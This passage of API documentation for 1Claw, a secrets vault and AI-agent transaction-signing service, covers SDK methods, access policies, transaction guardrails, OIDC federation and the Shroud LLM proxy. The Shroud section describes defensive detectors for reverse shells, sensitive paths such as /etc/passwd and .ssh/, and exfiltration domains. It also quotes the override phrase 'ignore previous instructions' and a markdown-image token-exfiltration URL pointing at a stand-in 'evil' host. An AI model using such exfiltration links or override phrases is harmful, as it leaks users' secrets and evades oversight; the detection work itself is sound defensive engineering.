| `auth`    | `login({ email, password })`                                                                                 | Human login                            |
| `auth`    | `agentToken({ agent_id, api_key })`                                                                          | Agent JWT exchange                     |
| `auth`    | `logout()`                                                                                                   | Revoke token                           |
| `auth`    | `sendEmailOtp({ email, platform_app_id? })`                                                                  | Send 6-digit OTP code to email         |
| `auth`    | `verifyEmailOtp({ email, code, platform_app_id?, auto_provision_chains? })`                                   | Verify OTP → JWT + wallet_address      |
| `auth`    | `socialLogin({ provider, id_token, ... })`                                                                    | Social login (Google/Apple/Discord)    |
| `auth`    | `exchangeOAuthCode({ code, redirect_uri, code_verifier? })`                                                  | Exchange OAuth authorization code      |
| `auth`    | `generatePKCE()`                                                                                             | Generate PKCE code_verifier + code_challenge (S256) |
| `auth`    | `buildAuthorizeUrl({ app_slug, redirect_uri, scopes?, state?, code_challenge? })`                            | Build OAuth2 authorize URL with params |
| `auth`    | `getUserInfo(accessToken)`                                                                                   | Get user info from OAuth access token  |
| `auth`    | `revokeToken({ token, token_type_hint? })`                                                                   | Revoke an OAuth access/refresh token (RFC 7009) |
| `auth`    | `revokeConsent(appSlug)`                                                                                     | Revoke all consent + tokens for an app |
| `apiKeys` | `create({ name, scopes?, expires_at? })`                                                                     | Create personal API key                |
| `apiKeys` | `list()`                                                                                                     | List API keys                          |
| `apiKeys` | `revoke(keyId)`                                                                                              | Revoke key                             |
| `chains`  | `list()`                                                                                                     | List supported chains                  |
| `chains`  | `get(identifier)`                                                                                            | Get chain by name or ID                |
| `treasury`| `create({ name, safe_address, chain?, chain_id?, threshold?, signers? })`                                     | Create treasury (Safe multisig)         |
| `treasury`| `list()`, `get(treasuryId)`, `update(treasuryId, { name?, threshold? })`, `delete(treasuryId)`               | List/get/update/delete treasuries      |
| `treasury`| `addSigner(treasuryId, { signer_type, signer_id, signer_address })`                                            | Add signer to treasury                 |
| `treasury`| `removeSigner(treasuryId, signerId)`                                                                         | Remove signer                          |
| `treasury`| `requestAccess(treasuryId, { reason })`                                                                      | Request access (agent-only)            |
| `treasury`| `listAccessRequests(treasuryId)`                                                                             | List access requests                   |
| `treasury`| `approveAccess(treasuryId, requestId)`, `denyAccess(treasuryId, requestId)`                                   | Approve or deny access request        |
| `treasury`| `propose(treasuryId, { to, value, chain, data? })`                                                           | Create multisig proposal              |
| `treasury`| `listProposals(treasuryId, { status? })`                                                                     | List proposals                        |
| `treasury`| `getProposal(treasuryId, proposalId)`                                                                        | Get proposal + signatures             |
| `treasury`| `signProposal(treasuryId, proposalId, { decision? })`                                                        | Sign proposal (approve/reject)        |
| `treasury`| `executeProposal(treasuryId, proposalId)`                                                                    | Force-execute if threshold met        |
| `treasuryWallets`| `generate({ chains? })`                                                                               | Generate multi-chain wallets (human-only) |
| `treasuryWallets`| `list()`                                                                                              | List active treasury wallets           |
| `treasuryWallets`| `get(chain)`                                                                                          | Get wallet by chain                    |
| `treasuryWallets`| `export(chain, { password })`                                                                         | Export wallet with private key (requires password re-auth via `X-Auth-Confirm`) |
| `treasuryWallets`| `rotate(chain)`                                                                                       | Rotate wallet keypair                  |
| `treasuryWallets`| `deactivate(chain)`                                                                                   | Deactivate wallet                      |
| `treasuryWallets`| `getEffectiveSpendPolicy()`                                                                           | View effective spend policy            |
| `depositDestinations` | `create({ chain, label?, treasury_wallet_id? })`                                                 | Create inbound deposit address         |
| `depositDestinations` | `list(chain?, status?)`                                                                          | List deposit destinations              |
| `internalAccounts` | `create({ name })`                                                                                  | Create internal ledger account         |
| `internalAccounts` | `transfer({ from_account_id, to_account_id, asset, amount })`                                       | Off-chain transfer between accounts    |
| `fiat`           | `createOnrampSession({ chain, amount_usd? })`                                                         | Fiat-to-crypto widget URL              |
| `fiat`           | `initiateOfframp({ chain, asset, amount })`                                                           | Crypto-to-fiat widget URL              |
| `platform`| `createApp({ name, slug, billing_model?, auth_mode?, ... })`                                                  | Register platform app (returns plt_ key) |
| `platform`| `listApps()`                                                                                                 | List platform apps                     |
| `platform`| `getApp(appId)`                                                                                              | Get platform app                       |
| `platform`| `updateApp(appId, { ... })`                                                                                  | Update platform app                    |
| `platform`| `deleteApp(appId)`                                                                                           | Delete platform app                    |
| `platform`| `createTemplate(appId, { name, spec })`                                                                      | Create bootstrap template              |
| `platform`| `listTemplates(appId)`                                                                                       | List templates                         |
| `platform`| `upsertUser({ subject_token?, email? })`                                                                     | Provision/find user (platform-only)    |
| `platform`| `bootstrapUser(connectionId, { template_id?, return_to? })`                                                  | Bootstrap from template                |
| `platform`| `claimPreview(token)`                                                                                        | Preview claim token (public)           |
| `platform`| `claimRedeem(token)`                                                                                         | Redeem claim token (public)            |
| `platform`| `listConnectedApps()`                                                                                        | List connected apps (user-only)        |
| `platform`| `createSpendPolicy(appId, { ... })`                                                                          | Create app-level wallet spend policy   |
| `platform`| `listSpendPolicies(appId)`                                                                                   | List active spend policies             |
| `platform`| `setUserSpendPolicy(connectionId, { ... })`                                                                  | Set per-user spend policy override     |
| `platform`| `deleteSpendPolicy(appId, policyId)`                                                                         | Deactivate a spend policy              |
| `platform`| `rotateWebhookSecret(webhookId)`                                                                             | Rotate webhook HMAC signing secret     |
| `platform`| `getAppStats(appId)`                                                                                         | Get app stats (users, bootstraps, active connections) |
| `platform`| `marketplace()`                                                                                              | List approved marketplace apps (public) |
| `oauthConnect` | `listProviders()`                                                                                     | List available OAuth providers (public) |
| `oauthConnect` | `listConnections(agentId)`                                                                            | List agent's OAuth connections         |
| `oauthConnect` | `connect(agentId, { provider_slug, scopes?, redirect_after? })`                                       | Initiate OAuth flow (human-only)       |
| `oauthConnect` | `disconnect(agentId, bindingId)`                                                                      | Disconnect OAuth binding               |
| `oauthConnect` | `saveAppCredentials(agentId, { provider_slug, client_id, client_secret, redirect_uri? })`             | Save org OAuth credentials             |
| `oauthConnect` | `listAppCredentials(agentId)`                                                                         | List app credentials (secrets redacted) |
| `oauthConnect` | `deleteAppCredentials(agentId, providerSlug)`                                                         | Delete app credentials                 |
| `org`     | `listMembers()`                                                                                              | List org members                       |
| `org`     | `updateMemberRole(userId, role)`                                                                             | Update member role                     |
| `org`     | `removeMember(userId)`                                                                                       | Remove member                          |
| `cedarPolicies` | `create({ policy_text, description? })`, `list()`, `get(id)`, `delete(id)`, `test({ ... })`           | Cedar policy CRUD + dry-run (Team+)    |
| `opaPolicies` | `create({ rego, description? })`, `list()`, `get(id)`, `delete(id)`, `test({ ... })`                    | OPA policy CRUD + dry-run (Business+)  |
| `subOrgs` | `create({ name, description? })`, `list()`, `get(id)`, `delete(id)`                                          | Sub-organization management            |
| `portfolio` | `get({ chains?, include_tokens? })`                                                                         | Unified balance aggregator             |
| `agents`  | `importSmartAccount(agentId, { chain, chain_id, safe_address, verify? })`                                    | Import existing Gnosis Safe            |

### OpenAPI spec for custom SDKs

The API spec is published as an npm package for generating clients in any language:

```bash
npm install @1claw/openapi-spec
```

Ships `openapi.yaml` and `openapi.json`. Use with any OpenAPI 3.1 codegen tool:

```bash
# TypeScript
npx openapi-typescript node_modules/@1claw/openapi-spec/openapi.yaml -o ./types.ts

# Python
openapi-generator generate -i node_modules/@1claw/openapi-spec/openapi.yaml -g python -o ./oneclaw-py

# Go
oapi-codegen -package oneclaw node_modules/@1claw/openapi-spec/openapi.yaml > oneclaw.go
```

SDK also re-exports generated types: `import type { ApiSchemas } from "@1claw/sdk"`.

---

## Supported Chains

Default chain registry (query `GET /v1/chains` for live list):

| Name         | Chain ID | Testnet |
| ------------ | -------- | ------- |
| ethereum     | 1        | no      |
| base         | 8453     | no      |
| optimism     | 10       | no      |
| arbitrum-one | 42161    | no      |
| polygon      | 137      | no      |
| sepolia      | 11155111 | yes     |
| base-sepolia | 84532    | yes     |
| arc-testnet  | 5042002  | yes     |

Use chain names (e.g. `"base"`, `"sepolia"`, `"arc-testnet"`) or numeric chain IDs in transaction requests.

---

## Access Control Model

Agents do **not** get blanket access. A human must create a policy to grant an agent access to specific secret paths.

- **Path patterns**: Glob syntax — `api-keys/*`, `db/**`, `**` (all)
- **Permissions**: `read`, `write` (delete requires `write`)
- **Conditions**: IP allowlist, time windows (JSON)
- **Expiry**: Optional ISO 8601 date

If no policy matches → **403 Forbidden**. Vault creators always have full access (owner bypass).

### Vault binding and token scoping

Agents can be restricted beyond policies:

- **`vault_ids`**: Restrict the agent to specific vaults. If non-empty, any request to a vault not in the list returns 403.
- **`token_ttl_seconds`**: Custom JWT expiry per agent (e.g., 300 for 5-minute tokens).
- **Scopes from policies**: JWT scopes are derived from the agent's access policies. If an agent has no policies and no explicit scopes, it has zero access.

Set via dashboard, CLI (`--token-ttl`, `--vault-ids`), SDK, or API.

### Customer-Managed Encryption Keys (CMEK)

Enterprise opt-in feature (Business tier and above). A human generates a 256-bit AES key in the dashboard — the key never leaves their device. Only its SHA-256 fingerprint is stored on the server.

- Enable: `POST /v1/vaults/{id}/cmek` with `{ fingerprint }`
- Disable: `DELETE /v1/vaults/{id}/cmek`
- Rotate: `POST /v1/vaults/{id}/cmek-rotate` (server-assisted, batched in 100s)
- Secrets stored in a CMEK vault have `cmek_encrypted: true` in responses

Agents reading from a CMEK vault receive the encrypted blob. The CMEK key is required to decrypt client-side. This is designed for organizations with compliance requirements — the default HSM encryption is already strong.

### Intents API

When `intents_api_enabled = true` (set by a human):

1. Agent **gains** transaction signing via the Intents API (keys stay in HSM)
2. Agent is **blocked** from reading `private_key` and `ssh_key` secrets directly (403)

#### TEE Enforcement (Pro+)

Two additional agent-level flags upgrade "TEE-available" to "TEE-required":

| Flag | Behavior when true |
| --- | --- |
| `intents_require_tee` | Rejects transaction/sign requests not routed through Shroud TEE (403). Direct Vault calls fail. |
| `execution_require_tee` | Rejects execute requests not routed through Shroud, AND blocks ALL direct secret reads by the agent (not just private_key/ssh_key). Forces use of Execution Intents bindings. |

Both require the base flag to be on first (`intents_api_enabled` / `execution_intents_enabled`). Verification uses HMAC `X-1Claw-TEE-Origin` header (Shroud sets it; Vault validates via shared `ONECLAW_TEE_ORIGIN_SECRET`). Dashboard: Signing tab toggles with confirmation dialog.

Default signing key path auto-resolves: if the agent has a per-chain signing key provisioned, uses `agents/{id}/chains/{chain}/private_key`; otherwise falls back to `keys/{chain}-signer`. Network names (e.g. `sepolia`, `base`) map to canonical signing key chains (e.g. `ethereum`) via `signing_key_chain_for()`. Override with `signing_key_path` (restricted to `keys/*`, `wallets/*`, `agents/{id}/keys/*`, or `agents/{id}/chains/*` — other paths are rejected to prevent arbitrary secret exfiltration).

#### Multi-chain signing keys (v0.18)

Agents can have per-chain signing keys for 6 blockchains: Ethereum (secp256k1), Bitcoin (secp256k1), Solana (Ed25519), XRP (Ed25519, **31 supported types** via `xrpl_tx_json` — a 1Claw subset, not the full XRPL catalog), Cardano (Ed25519), Tron (secp256k1). All six chains support **on-chain transaction signing + broadcast** through the Intents API (`submit_transaction` / `sign_transaction`) — 1claw dispatches by chain family, auto-fetches chain data (Bitcoin UTXOs/fee, Solana blockhash, XRP sequence, Cardano protocol params, Tron ref block), signs in the HSM/TEE, and broadcasts. `value` is the major-unit decimal string. **XRP**: `to` and `value` remain required on submit/sign even with `xrpl_tx_json` (use `"0"` for non-Payment types). Pass `xrpl_tx_json` with one of 1Claw's 31 supported types (Payment, TrustSet, OfferCreate, OfferCancel, EscrowCreate/Finish/Cancel, PaymentChannelCreate/Fund/Claim, NFTokenMint/Burn/CreateOffer/AcceptOffer/CancelOffer, AMMCreate/Deposit/Withdraw/Bid/Delete/Vote, DepositPreauth, CheckCreate/Cash/Cancel, TicketCreate, Clawback; plus SetRegularKey, SignerListSet, AccountSet, AccountDelete which are **blocked unless** explicitly listed in `xrpl_allowed_tx_types`). Auto-fills Account, Sequence, Fee (`"12"` drops), LastLedgerSequence (ledger + 20), SigningPubKey, Flags (`0x80000000`), and SourceTag `482684816` (caller-supplied wins). Top-level `memo` is not applied on XRP — put `Memos` inside `xrpl_tx_json`. Private keys stored in `__agent-keys` vault at `agents/{id}/chains/{chain}/private_key`. Provisioned by humans only. Use `provision_signing_key` MCP tool or `client.signingKeys.create()`. **Export**: `POST /v1/agents/{id}/signing-keys/{chain}/export` — human-only, requires `X-Auth-Confirm` password header; returns `{ private_key, public_key, address, curve, chain }`; audit-logged; failed re-auth triggers account lockout.

#### Extended signing intents (v0.18)

Unified `POST /v1/agents/{id}/sign` with `intent_type`:
- `personal_sign` — EIP-191 message signing (requires `message_signing_enabled`)
- `typed_data` — EIP-712 typed data signing (deny-by-default; dangerous types like Permit always require `eip712_domain_allowlist`)
- `eip712_digest` (alias `digest`) — raw/blind signing of a client-computed 32-byte `hash` → 65-byte `r‖s‖v` signature; for ERC-1271/ERC-7739 nested EIP-712 flows (e.g. Polymarket). Requires human-set `raw_signing_enabled` (off by default); bypasses guardrails; audit-logged.
- `transaction` — EIP-2718 types 0–4 (legacy, EIP-2930, EIP-1559, EIP-4844, EIP-7702)

Use `sign_message`, `sign_typed_data`, and `sign_digest` MCP tools, or `client.agents.signIntent()`.

#### Replay protection (Idempotency-Key)

Include an `Idempotency-Key: <unique-string>` header on `POST /v1/agents/{id}/transactions`. The server SHA-256 hashes the key and caches the result for 24 hours. Duplicate submissions with the same key return the cached response instead of re-signing and re-broadcasting. If two concurrent requests share a key, one returns 409 (retry after a moment).

#### Server-side nonce serialization

When `nonce` is omitted from a transaction request, the server resolves it automatically via `eth_getTransactionCount` (pending) and serializes concurrent callers with `SELECT FOR UPDATE`. This prevents two in-flight submissions from the same agent+chain+address from receiving the same nonce. You can still pass an explicit `nonce` to override.

#### signed_tx field gating

GET endpoints (`/v1/agents/{id}/transactions` and `/v1/agents/{id}/transactions/{txid}`) **redact** the `signed_tx` field by default to reduce exfiltration risk. To include it, pass `?include_signed_tx=true`. The initial POST response always includes `signed_tx` for the originating caller.

### Transaction guardrails

Human-configured, server-enforced limits on what the Intents API allows:

| Guardrail            | Field                | Effect                                                |
| -------------------- | -------------------- | ----------------------------------------------------- |
| Allowed destinations | `tx_to_allowlist`    | Only listed addresses permitted. Empty = unrestricted |
| Max value per tx     | `tx_max_value`       | Single-tx cap in native major units (ETH, BTC, SOL, etc.). NULL = unlimited |
| Daily spend limit    | `tx_daily_limit`     | Rolling 24h cap per chain family in native major units. NULL = unlimited    |
| Allowed chains       | `tx_allowed_chains`  | Chain names. Empty = all chains                       |
| Daily tx count       | `tx_max_per_day`     | Max transactions per UTC calendar day. NULL = unlimited |
| Overhead budget      | `tx_overhead_budget` | Per-chain daily budget for non-value costs (rent, fees, energy) in native units |
| ATA allowlist        | `solana_ata_allowlist` | Only listed Solana addresses may have ATAs created. Empty = unrestricted |
| XRPL tx types        | `xrpl_allowed_tx_types` | Restrict XRPL `TransactionType`. Empty = all supported *except* SetRegularKey, SignerListSet, AccountSet, AccountDelete (those need explicit listing) |

Per-chain overrides via `per_chain_guardrails` also support `max_per_day`, `overhead_budget`, and `max_ata_creates_per_day`.

Agents **cannot** modify their own guardrails. Violations return 403 with a descriptive error.

### OIDC Federation (1Claw as Identity Provider)

1claw publishes a standard OpenID Connect issuer at `https://api.1claw.xyz`, so external relying parties (Anthropic Workload Identity Federation, GCP STS, AWS STS, Stytch, etc.) can validate 1claw-issued JWTs without static API keys.

- **Discovery:** `GET https://api.1claw.xyz/.well-known/openid-configuration` advertises `issuer`, `jwks_uri`, `id_token_signing_alg_values_supported: ["EdDSA","RS256"]`, and grant types incl. `urn:ietf:params:oauth:grant-type:token-exchange`.
- **JWKS:** `GET https://api.1claw.xyz/.well-known/jwks.json` lists every active EdDSA + RS256 KMS key version, each keyed by a deterministic `kid` (`eddsa-vN`, `rs256-vN`). Cached for 5 minutes; CORS `*`.
- **Token exchange:** `POST /v1/auth/federated-token` (RFC 8693). Subject token can be a regular agent JWT or an `ocv_` API key. Returns an **RS256-signed** JWT (HSM-backed RSA 2048) with the requested `aud`. Default TTL 15 min, hard cap 60 min.

**Per-agent guardrails (zero-trust by default):**

| Field                          | Type     | Default | Description                                                            |
| ------------------------------ | -------- | ------- | ---------------------------------------------------------------------- |
| `federation_enabled`           | boolean  | false   | When true, agent may call `/v1/auth/federated-token`                    |
| `federation_audiences`         | string[] | `[]`    | Allowlist of acceptable `aud` values. Empty = deny all federation requests |
| `federated_token_ttl_seconds`  | number?  | null    | Per-agent TTL override (60–3600s). NULL falls back to global default    |

**SDK:**

```typescript
const tokenResp = await client.auth.exchangeFederatedToken({
    audience: "https://api.anthropic.com",
    // subjectToken defaults to current client token / apiKey if omitted
});
console.log(tokenResp.data?.access_token); // RS256 JWT
```

**CLI:**

```bash
1claw auth federated-token --audience https://api.anthropic.com
1claw auth federated-token -a https://api.anthropic.com --raw  # script-friendly
```

**Anthropic WIF flow:**

1. Human enables `federation_enabled = true` and adds Anthropic to `federation_audiences` in the dashboard.
2. Agent calls `POST /v1/auth/federated-token` (or `client.auth.exchangeFederatedToken`) with `audience: "https://api.anthropic.com"`.
3. Agent posts the resulting JWT to Anthropic's WIF endpoint, which returns a short-lived `sk-ant-oat01-…` token.
4. Agent calls Claude with that Anthropic token. **No static `ANTHROPIC_API_KEY` ever leaves 1claw or sits in env.**

End-to-end demo: [`examples/anthropic-wif`](https://github.com/1clawAI/1claw-examples/tree/main/anthropic-wif).

### Shroud per-agent LLM proxy

When `shroud_enabled = true` (set by a human), the agent's LLM traffic is routed through Shroud (`shroud.1claw.xyz`) for secret redaction, PII scrubbing, prompt injection defense, threat detection, and policy enforcement inside a TEE.

`shroud_config` is an optional JSON object that lets humans fine-tune the proxy behavior per agent:

#### Basic settings

| Field                         | Type                                             | Description                                   |
| ----------------------------- | ------------------------------------------------ | --------------------------------------------- |
| `pii_policy`                  | `"block"` \| `"redact"` \| `"warn"` \| `"allow"` | How PII in LLM traffic is handled             |
| `injection_threshold`         | number (0.0–1.0)                                 | Prompt injection detection sensitivity        |
| `context_injection_threshold` | number (0.0–1.0)                                 | Context injection detection sensitivity       |
| `allowed_providers`           | string[]                                         | LLM providers the agent may use (empty = all) |
| `allowed_models`              | string[]                                         | Models the agent may use (empty = all)        |
| `denied_models`               | string[]                                         | Models explicitly blocked                     |
| `max_tokens_per_request`      | number                                           | Token cap per LLM request                     |
| `max_requests_per_minute`     | number                                           | Per-minute rate limit                         |
| `max_requests_per_day`        | number                                           | Per-day rate limit                            |
| `daily_budget_usd`            | number                                           | Daily LLM spend cap in USD                    |
| `enable_secret_redaction`     | boolean                                          | Redact vault secrets from LLM context         |
| `enable_response_filtering`   | boolean                                          | Filter sensitive data from LLM responses      |

#### Threat detection settings

Multi-layered detection for prompt injection, command injection, social engineering, and data exfiltration attempts:

| Field                          | Type   | Description                                                         |
| ------------------------------ | ------ | ------------------------------------------------------------------- |
| `unicode_normalization`        | object | Homoglyph/zero-width character normalization (see below)            |
| `command_injection_detection`  | object | Detect shell commands, path traversal, reverse shells               |
| `social_engineering_detection` | object | Detect urgency, authority claims, secrecy requests, bypass attempts |
| `encoding_detection`           | object | Detect base64, hex, Unicode escapes that may hide payloads          |
| `network_detection`            | object | Detect blocked domains, IP URLs, data exfiltration patterns         |
| `filesystem_detection`         | object | Detect sensitive paths (/etc/passwd, .ssh/, .env, etc.)             |
| `sanitization_mode`            | string | `"block"` (reject threats), `"surgical"` (strip), `"log_only"` (log) |
| `threat_logging`               | boolean| Log detected threats for audit (default: true)                      |

**Extended inspection pipeline** — Beyond the threat detectors above, `shroud_config` also supports: `tool_call_inspection` (scan function/tool call arguments, block credential exfiltration — `block_credential_exfil` defaults to **`true`**), `output_policy` (block harmful content, patterns, and entities in LLM responses), `secret_injection_detection` (detect secrets injected into prompts/responses), `advanced_redaction` (detect base64-encoded, split, or prefix-leaked secrets), and `semantic_policy` (enforce allowed/denied topics and tasks at the intent level). `flagged_request_retention_days` controls how long flagged requests are retained. Dashboard: `/shroud-activity` (overview), `/shroud-activity/threats`, `/shroud-activity/live` (real-time inspector).

**Bi-directional inspection (Shroud v0.5.0+)** — The inspection pipeline runs on the LLM **response** as well as the request. Response-side detectors catch: echoed / indirect prompt injection (model paraphrases "ignore previous instructions"), markdown-image exfil (`![x](https://evil/?token=…)`), data-URI exec blobs (`data:text/html;base64,…`), unexpected fenced code blocks (when `semantic_policy.allowed_tasks` does not include `code`), and exfil URLs in model output. Populates new audit fields: `response_injection_score`, `response_context_injection_score`, `response_injection_categories`, `external_urls_flagged`, `unexpected_code_blocks`. Default action: `Block` when score ≥ 0.7 and `output_policy.action = "block"`.

**`unicode_normalization` object:**

| Field                | Type    | Default | Description                                    |
| -------------------- | ------- | ------- | ---------------------------------------------- |
| `enabled`            | boolean | true    | Enable Unicode normalization                   |
| `strip_zero_width`   | boolean | true    | Remove zero-width characters (U+200B, U+200C)  |
| `normalize_homoglyphs` | boolean | true | Convert look-alike characters (Cyrillic а → a) |
| `normalization_form` | string  | `"NFKC"` | Unicode form: `"NFC"`, `"NFKC"`, `"NFD"`, `"NFKD"` |

**`command_injection_detection` object:**

| Field       | Type   | Default   | Description                                    |
| ----------- | ------ | --------- | ---------------------------------------------- |
| `action`    | string | `"block"` | `"block"`, `"sanitize"`, or `"warn"`           |
| `strictness`| string | `"default"` | `"strict"` (more patterns), `"default"`, `"relaxed"` |

**`social_engineering_detection` object:**

| Field       | Type   | Default  | Description                              |
| ----------- | ------ | -------- | ---------------------------------------- |
| `action`    | string | `"warn"` | `"block"` or `"warn"`                    |
| `sensitivity` | string | `"medium"` | `"low"` (more triggers), `"medium"`, `"high"` |

**`encoding_detection` object:**

| Field          | Type    | Default | Description                           |
| -------------- | ------- | ------- | ------------------------------------- |
| `action`       | string  | `"warn"` | `"block"`, `"decode"`, or `"warn"`   |
| `detect_base64`| boolean | true    | Detect base64 encoded content         |
| `detect_hex`   | boolean | true    | Detect \xNN hex escapes               |
| `detect_unicode` | boolean | true  | Detect \uNNNN Unicode escapes         |

**`network_detection` object:**

| Field             | Type     | Default                  | Description                        |
| ----------------- | -------- | ------------------------ | ---------------------------------- |
| `action`          | string   | `"warn"`                 | `"block"` or `"warn"`              |
| `blocked_domains` | string[] | pastebin, ngrok, etc.    | Domains to block (subdomains auto) |
| `allowed_domains` | string[] | []                       | Allowlist (empty = blocklist mode) |

**`filesystem_detection` object:**

| Field          | Type     | Default              | Description                       |
| -------------- | -------- | -------------------- | --------------------------------- |
| `action`       | string   | `"log"`              | `"block"`, `"sanitize"`, or `"log"` |
| `blocked_paths`| string[] | /etc/passwd, .ssh/, .env, etc. | Paths to detect            |

**SDK:**

```typescript
await client.agents.create({
    name: "my-agent",
    shroud_enabled: true,
    shroud_config: {
        pii_policy: "redact",
        injection_threshold: 0.8,
        allowed_providers: ["openai", "anthropic"],
        max_requests_per_day: 1000,
        daily_budget_usd: 10.0,
        enable_secret_redaction: true,
        // Threat detection
        unicode_normalization: { enabled: true, normalize_homoglyphs: true },
        command_injection_detection: { action: "block", strictness: "default" },
        social_engineering_detection: { action: "warn", sensitivity: "medium" },
        encoding_detection: { action: "warn", detect_base64: true },
        network_detection: { action: "warn", blocked_domains: ["pastebin.com"] },
        filesystem_detection: { action: "log" },
        sanitization_mode: "block",
        threat_logging: true,
    },
});

await client.agents.update(agentId, {
    shroud_enabled: true,
    shroud_config: { pii_policy: "block", injection_threshold: 0.9 },
});
```

**CLI:**

```bash
1claw agent create my-agent --shroud
1claw agent update <agent-id> --shroud true
1claw agent update <agent-id> --shroud false
```

**MCP:** When `shroud_enabled` is true, the agent can send LLM requests through `shroud.1claw.xyz`. Vault puts `shroud_config` on the **agent JWT**; Shroud applies it in **PolicyEngine** after the inspection pipeline (re-exchange credentials after changing Shroud settings). MCP vault tools are unchanged; LLM traffic does not go through MCP.

---

## Share with Your Human

Agents can share secrets back with the human who created or enrolled them. Use `recipient_type: "creator"` — no email or user ID needed.

**Via MCP:**

```
share_secret(secret_id: "...", recipient_type: "creator", expires_at: "2026-12-31T00:00:00Z")
```

**Via SDK:**

```typescript
await client.sharing.create(secretId, {
    recipient_type: "creator",
    expires_at: "2026-12-31T00:00:00Z",
    max_access_count: 5,
});
```

The human sees the share in their Inbound shares and accepts it. This is the primary pattern for agents that discover or generate credentials and need to report them to their human.

---

## Fleet Patterns

When many agents operate in the same organization:

- **Vault organization:** Use a shared vault with path-scoped policies (e.g. `agents/{name}/**`) or per-agent vaults for strict isolation.
- **Bulk provisioning:** Use the authenticated `POST /v1/agents` endpoint with a human API key to create many agents, or stagger self-enrollment calls to respect the 10-min per-email cooldown.
- **Vault binding:** Set `vault_ids` on each agent to restrict JWT scope beyond what policies allow.
- **Token TTL:** Shorten to 5 min for ephemeral tasks (`token_ttl_seconds: 300`), keep default 1h for long-running agents.
- **Transaction guardrails:** Apply `tx_max_value`, `tx_daily_limit`, and `tx_allowed_chains` to all Intents API agents.
- **Monitoring:** Filter the audit log by agent ID to track per-agent activity. Use `billing usage` to monitor org-wide consumption.

---

## Security Model

- **Credentials are configured by the human**, not the agent. The MCP server reads them from env vars.
- **The agent never sees its own credentials.** The MCP server authenticates on the agent's behalf.
- **Access is deny-by-default.** Even with valid credentials, only policy-allowed secrets are accessible.
- **Secret values are fetched just-in-time** and must never be stored, echoed, or included in summaries.
- **Agents cannot create email-based shares** (prevents unsolicited email sharing).
- **Intents API is opt-in.** When enabled, raw key reads are blocked.
- **Transaction guardrails are human-controlled and server-enforced.**
- **Token revocation:** `DELETE /v1/auth/token` (or SDK `auth.logout()`) revokes the current Bearer token; revoked tokens return 401.
- **Agent token auto-revocation:** When a policy is created, updated, or deleted for an agent, all active JWTs for that agent are revoked immediately (stale-scope protection via `agent_active_tokens` table).
- **KMS key rotation scheduling:** GCP KMS keys support scheduled automatic rotation; production uses HSM protection level (`protection_level: 2`).
- **CRC32C integrity verification:** KMS encrypt/decrypt responses are verified with CRC32C checksums to detect data corruption in transit.
- **Audit insert hardening:** Direct `INSERT` on `audit_events` is revoked from the application DB role; all audit writes go through a `SECURITY DEFINER` function (`insert_audit_event`) to prevent RLS bypass.
- **Account lockout:** 10 failed login attempts → 15-minute lock per user; resets on success.
- **Session revocation:** Password change or reset invalidates all existing JWTs for the user (`revoked_before` column).
- **Agent self-update guard:** Agents cannot `PATCH /v1/agents/{id}` on their own record — only human callers can modify agent settings.
- **Treasury delegation verification:** Intents API `mode: "treasury"` requires an active delegation with `delegated` or `both` mode. Owner-mode delegations must go through the multisig proposal pipeline.
- **Delegation guardrails enforcement:** Per-delegation guardrails (`to_allowlist`, `max_value_eth`, `allowed_chains`) are enforced during treasury-mode signing. Strictest of delegation + agent guardrails wins.
- **Webhook SSRF protection:** Webhook dispatcher validates destination URLs and disables redirect following.
- **Proposal signer authorization:** `sign_proposal` verifies the caller is a treasury signer or proposal creator.
- **Treasury send/swap lockout:** Failed password re-auth on send/swap triggers account lockout at 10 failures.
- **x402 unauthenticated amount verification:** The x402 middleware verifies payment amounts even for unauthenticated requests, preventing underpayment on public paid routes.
- **Request body limit:** 5MB max; larger requests return 413.
- **Nonce-based CSP:** Dashboard uses per-request cryptographic nonces with `'strict-dynamic'`; replaces previous `'unsafe-inline'` policy.
- **CORS explicit header allowlist:** Fixed 14-header allowlist (no wildcard).
- **Federation audience validation:** `validators.rs` blocks cloud metadata endpoints, private/loopback CIDRs, `.internal` hostnames, and localhost in production.
- **Platform cross-org binding:** `upsert_user` enforces `user.org_id == app.org_id`.
- **Nightly DEK re-wrap:** Re-encrypts DEKs under current primary KEK so old KMS versions can be destroyed.
- **HTTP client timeouts:** RPC calls (10s) and Tenderly simulation (30s) prevent indefinite hangs.
- **MCP secret cache:** 5-minute TTL, 1000-entry LRU, periodic cleanup.
- **MCP httpStream rate limiting:** 60 req/min per IP on hosted HTTP streaming transport.
- **Demo Shroud rate limiting:** 10 req/min per IP, requires authenticated session.
- **Platform OIDC JWKS SSRF prevention:** `validate_audience_url()` blocks SSRF via platform app `oidc_jwks_url` on create/update and inside `resolve_oidc_subject()`.
- **DEK re-wrap concurrency guard:** Nightly re-wrap uses `WHERE wrapped_dek = $old` optimistic lock to prevent races with concurrent secret writes.
- **IPv4-mapped IPv6 bypass fix:** `is_private_or_reserved()` checks `to_ipv4_mapped()`, ULA fc00::/7, link-local fe80::/10.
- **Dashboard proxy auth hardening:** Bundler and demo routes require session cookie + per-IP rate limiting; use `x-vercel-forwarded-for` for reliable IP.
- **Treasury export lockout integration:** Failed re-auth password on wallet export increments failed login attempts and triggers lockout at 10.
- **Signing key path UUID binding:** `validate_signing_key_path` enforces caller agent UUID match on `agents/{uuid}/` paths.
- **Platform OIDC audience enforcement:** `oidc_audience` column on platform apps (migration 089); enforced in JWT validation when set.

---

## Scaling & Performance (v0.17)

- **Database pool**: Configurable via `ONECLAW_POOL_MAX_CONNECTIONS` (default 5), `ONECLAW_POOL_MIN_CONNECTIONS` (default 0). Set `ONECLAW_POOL_DISABLE_STMT_CACHE=1` for Supavisor transaction-mode. Pool stats logged every 30s.
- **Rate limiting**: Two-layer — in-memory L1 + Redis L2 sliding window (`ONECLAW_REDIS_URL`). Both global and auth rate limiters fully wired to Redis L2.
- **DEK cache**: 60s TTL, 1000-entry DashMap cache for unwrapped DEKs. Cuts KMS calls ~80%.
- **Usage batching**: Events buffered in memory, batch-INSERTs every 5s or 100 events.
- **Manifest optimization**: `ETag`/`304` and `?since=` on `GET /v1/admin/secrets/manifest`.
- **Cron leader election**: `pg_try_advisory_lock` prevents duplicate nightly jobs across replicas.
- **Quota header caching**: 30s TTL per-org cache eliminates per-request DB lookups.
- **Nonce serialization**: Shroud calls `POST /v1/admin/nonces/reserve` for DB-backed atomic nonce reservation (eliminates multi-pod collisions).
- **HPA**: Custom `shroud_requests_per_second` metric via prometheus-adapter.

---

## Error Handling

| Code | Meaning                                                    | Action                                                                                                                                                                                            |
